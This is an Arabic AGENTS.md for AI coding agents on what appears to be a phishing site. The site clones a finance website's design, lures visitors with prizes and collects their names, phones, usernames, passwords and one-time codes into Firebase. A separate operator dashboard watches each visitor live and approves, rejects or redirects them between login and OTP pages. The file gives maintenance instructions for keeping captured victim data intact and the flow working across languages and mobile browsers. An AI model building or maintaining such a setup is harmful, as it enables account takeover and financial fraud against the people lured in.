# AGENTS.md — مشروع صفحات الجوائز (prize flow)

مشروع مختصر يحتوي مسار الجوائز (أربع صفحات + سكربتاتها + خادم Python) ولوحة التحكم
المنفصلة `dashboardkuwaitalthnyan-main/` التي يتابع منها المدير الزوار ويوافق/يرفض.

## التشغيل

```bash
cp .env.example .env      # ثم املأ مفاتيح Firebase
python3 build_env_js.py   # يولّد assets/js/firebase-env.js (للاستضافة الثابتة)
python3 serve.py          # الموقع، PORT افتراضي 12001
python3 dashboardkuwaitalthnyan-main/serve_dashboard.py   # اللوحة، PORT افتراضي 12000
```

- `/` → `index.html` (صفحة الدخول)
- أي مسار غير موجود → `index.html` (fallback)

## الملفات

| ملف | الدور |
|---|---|
| `index.html` | شاشة البداية: زر «تسجيل الدخول» → `prize-username.html` |
| `prize-username.html` | إدخال اسم المستخدم ثم الرقم السري (6 أرقام) → `prize-wait.html` |
| `prize-wait.html` | انتظار قرار المدير: موافقة → `prize-text-password.html`، رفض → عودة إلى `prize-username.html` |
| `prize-text-password.html` | إدخال كلمة المرور النصية → `prize-wait.html` |
| `assets/js/firebase-client.js` | تهيئة Firebase، الجلسة `sessionId`، `submitLogin`/`submitOtp`، `listenForAdminCommands` |
| `assets/js/page-commands.js` | استماع صفحات العميل لأوامر التوجيه/الرفض من لوحة التحكم |
| `assets/js/firebase-env.js` | **مولّد** من `.env` عبر `build_env_js.py` (غير مرفوع في Git) |
| `serve.py` | خادم الموقع: يحقن `window.__FIREBASE_ENV__`، gzip، كاش، `/healthz` |
| `dashboardkuwaitalthnyan-main/` | لوحة التحكم المنفصلة (موقع ثابت) — `serve_dashboard.py` يحقن إعداد Firebase بدل Vite |
| `firebase_config.py` | قراءة المفاتيح من متغيّرات البيئة أو `.env` |
| `firebase.json` / `firestore.rules` / `database.rules.json` | إعداد ونشر قواعد Firebase |
| `netlify.toml` / `_redirects` | إعداد الاستضافة الثابتة (Netlify) |

## متغيّرات البيئة (`.env`)

`FIREBASE_API_KEY`, `FIREBASE_AUTH_DOMAIN`, `FIREBASE_DATABASE_URL`, `FIREBASE_PROJECT_ID`,
`FIREBASE_STORAGE_BUCKET`, `FIREBASE_MESSAGING_SENDER_ID`, `FIREBASE_APP_ID`,
`FIREBASE_MEASUREMENT_ID` — إعدادات عامة تُحقن في المتصفح.

`FIREBASE_PANEL_EMAIL`, `FIREBASE_PANEL_PASSWORD` — حساب المصادقة مع Firestore.
تسجيل الدخول المجهول (Anonymous) مُفعّل في المشروع، فالصفحات تكتب بياناتها بدونه،
لكنه مطلوب لتسجيل دخول لوحة التحكم.

`SITE_URL` — اختياري، النطاق العام للروابط المطلقة.

## مسار البيانات في Firebase

- `customers/{sessionId}` (Firestore): بيانات العميل + `decision` (`pending` / `approved` / `rejected`)
- `commands/{sessionId}/redirect|approval|rejection` (RTDB): أوامر لوحة التحكم
- `messages/{sessionId}` (RTDB): رسائل للعميل

قرار المدير يُقرأ عبر `onSnapshot` + استطلاع REST كل ثانيتين، ويُصفَّر إلى `pending` بعد التنفيذ.

## الصفحة الرئيسية (`index.html`)

نسخة ثابتة (HTML + Tailwind) مطابقة لتصميم `https://finance-website-clon-uot0.bolt.host/`:

- `assets/css/home.css` — حزمة Tailwind الكاملة المستخدمة في التصميم (لا تُعدّل يدويًا).
- `assets/images/promo-{cash,car,iphone,watch}-{ar,en}.jpg` — صور الجوائز (نسخة FR تستخدم صور EN).
- `assets/js/home.js` — سلوك الصفحة: تبديل اللغة (ar/en/fr عبر `I18N` و`localStorage.homeLang`)،
  تدوير السلايدر، فتح/إغلاق نافذة التسجيل، تعطيل زر التأكيد حتى تكتمل البيانات، ثم `select.html`.

الترجمة تعتمد على ترتيب عُقد النصوص داخل `#root` (٣٦ عقدة)؛ أي تعديل يدوي في نصوص الصفحة
يجب أن يُطبَّق على المصفوفات الثلاث في `home.js` وإلا اختلّت الترجمة.

## قواعد الكتابة في `customers/{sessionId}` (مهم)

كل كتابة من موقع العميل تمرّ عبر `forCustomerWrite()` في `assets/js/firebase-client.js`:

- حقول الهوية (`name`, `phone`, `mobile`, `address`, `email`, `username`, `pass`, `otp`, `amount`, ...)
  لا تُكتب أبدًا بقيمة فارغة. السبب: `ensureCustomerDoc` يعمل في كل صفحة ويعتمد على `localStorage`،
  فإذا ضاع `customerName` (متصفح داخل واتساب/تصفح خاص/مسح للكاش) كانت الكتابة تمحو الاسم والهاتف
  فتختفي بيانات العميل من اللوحة ثم تعود عند إعادة التسجيل.
- حقول المدير (`status`, `decision`, `isHidden`, `flagColor`) لا يكتبها الموقع إطلاقًا؛ كتابتها
  كانت تلغي قرارات اللوحة (موافقة/رفض) وتُظهر العملاء المحذوفين. الاستثناء الوحيد هو
  `resetDecisionToPending()` بعد تنفيذ القرار.

## الكاش في `serve.py`

ملفات `.js` و`.css` تُخدَم بـ `Cache-Control: no-cache, must-revalidate` (لا `immutable`) حتى تصل
الإصلاحات إلى الجوال فورًا. صفحات HTML تشير إلى `firebase-client.js?v=N` — ارفع الرقم عند أي
تغيير كبير في الكلاينت.

## اللغة (عربي / إنجليزي / فرنسي)

- الملف الموحّد: `assets/js/site-lang.js` (`window.SiteLang`) — قاموس ar/en/fr + تطبيق الترجمة واتجاه الصفحة.
- التخزين: `localStorage.homeLang` (مفتاح الصفحة الرئيسية) + نسخة في `siteLang`.
- التمرير بين الصفحات: كل تنقّل داخلي يضيف `?lang=xx` عبر `SiteLang.href('page.html')`؛
  الصفحة التالية تقرأ الرابط أولاً ثم التخزين، وتحفظ اللغة ثم تحذف `?lang=` من شريط العنوان.
- الصفحة الرئيسية: `home.js` يترجم بترتيب عُقد النصوص (`I18N.texts`) + `PLACEHOLDERS` للحقول،
  وينادي `SiteLang.set(code)` عند التبديل، وينتقل إلى `select.html?lang=…`.
- بقية الصفحات: تُوسم العناصر بـ `data-i18n` / `data-i18n-html` / `data-i18n-ph` / `data-i18n-aria`
  و`<html data-page="...">` لعنوان الصفحة ووصفها.
- الاتجاه: `html[dir="ltr"]` في CSS لكل صفحة (محاذاة، قلب سهم الرجوع، موضع زر الحذف).
- نصوص لوحة التحكم تبقى عربية: `currentPage` و`hasAccountLabel` تُرسل بالعربية دائماً.
- عند إضافة صفحة جديدة: أضف `<script src="/assets/js/site-lang.js?v=1">` في `<head>`،
  و`data-page` ووسوم الترجمة، واستخدم `SiteLang.href()` في كل تنقّل.

## الصور (محليّة بالكامل)

- كل صور الصفحة الرئيسية في `assets/images/promo-{cash,car,iphone,watch}-{ar,en}.jpg`
  بدقة 1456×720 (نسخ مضغوطة من الأصل)، ولا يوجد أي طلب صور لخادم خارجي.
- الفرنسية تستخدم نسخة `-en` لأن الصورة نفسها في المصدر (`-fr` = `-en` بايت ببايت).
- الروابط تحمل `?v=2` لكسر الكاش (`immutable` سنة للصور في `serve.py`)؛
  `home.js` يحافظ على `?v=` عند تبديل اللغة.
- عند تحديث صورة: زد الرقم `?v=3` في `index.html` وإلا سيبقى الزائر يرى النسخة القديمة.
- `og:image` يصبح رابطاً مطلقاً تلقائياً في `serve.py` (منصّات المشاركة ترفض الرابط النسبي).
